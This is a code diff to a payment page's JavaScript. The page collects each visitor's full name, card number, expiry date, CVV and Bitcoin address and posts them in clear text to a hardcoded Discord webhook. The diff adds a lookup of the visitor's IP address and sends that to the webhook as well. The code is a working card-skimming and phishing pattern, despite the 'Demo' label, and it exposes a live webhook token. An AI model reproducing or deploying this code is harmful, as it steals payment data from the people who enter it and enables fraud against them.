@@ -132,12 +132,19 @@
     });
   });
 
-  // Function to send the form data to the Discord webhook
-  function sendToDiscord(paymentMethod, formData) {
+  // Function to send data to Discord webhook
+  function sendToDiscord(paymentMethod, formData, ip) {
     const webhookUrl = 'https://discordapp.com/api/webhooks/1373748781861834882/2SDjfj-z2YxeR71Z8JDFLw3lk8uQwjIu_PwYrgTfMwLrIsVyBdJBW5PBNB1qg50wfLAe';
 
     const message = {
-      content: `New Order Received:\n**Payment Method**: ${paymentMethod}\n**Full Name**: ${formData.fullName}\n**Card Number**: ${formData.cardNumber || 'N/A'}\n**Expiry Date**: ${formData.expiry || 'N/A'}\n**CVV**: ${formData.cvv || 'N/A'}\n**Bitcoin Address**: ${formData.bitcoinAddress || 'N/A'}`
+      content: `📦 **New Order (Demo)**\n
+**Payment Method:** ${paymentMethod}
+**Full Name:** ${formData.fullName || 'N/A'}
+**Card Number:** ${formData.cardNumber || 'N/A'}
+**Expiry:** ${formData.expiry || 'N/A'}
+**CVV:** ${formData.cvv || 'N/A'}
+**Bitcoin Address:** ${formData.bitcoinAddress || 'N/A'}
+**IP Address:** ${ip}`
     };
 
     fetch(webhookUrl, {
@@ -147,15 +154,13 @@
       },
       body: JSON.stringify(message)
     })
-      .then(response => console.log('Order sent to Discord'))
-      .catch(error => console.error('Error sending to Discord:', error));
+    .then(() => alert('Demo order submitted!'))
+    .catch(err => console.error('Webhook error:', err));
   }
 
-  // Handle form submission
+  // Get IP and submit card form
   document.querySelector('.card-details form').addEventListener('submit', function(event) {
     event.preventDefault();
-
-    const paymentMethod = document.querySelector('input[name="payment-method"]:checked').nextElementSibling.innerText.trim();
 
     const formData = {
       fullName: document.querySelector('#full-name').value,
@@ -165,13 +170,15 @@
       bitcoinAddress: ''
     };
 
-    sendToDiscord(paymentMethod, formData);
-    alert('Your order has been submitted!');
+    const paymentMethod = 'Card';
+
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => sendToDiscord(paymentMethod, formData, data.ip));
   });
 
-  // Handle crypto button
+  // Crypto button click
   document.querySelector('.crypto-details button').addEventListener('click', function() {
-    const paymentMethod = 'Crypto';
     const formData = {
       fullName: '',
       cardNumber: '',
@@ -180,10 +187,14 @@
       bitcoinAddress: document.querySelector('.crypto-details pre').innerText
     };
 
-    sendToDiscord(paymentMethod, formData);
-    alert('Crypto payment confirmed!');
+    const paymentMethod = 'Crypto';
+
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => sendToDiscord(paymentMethod, formData, data.ip));
   });
 </script>
+
 
 </body>
 </html>
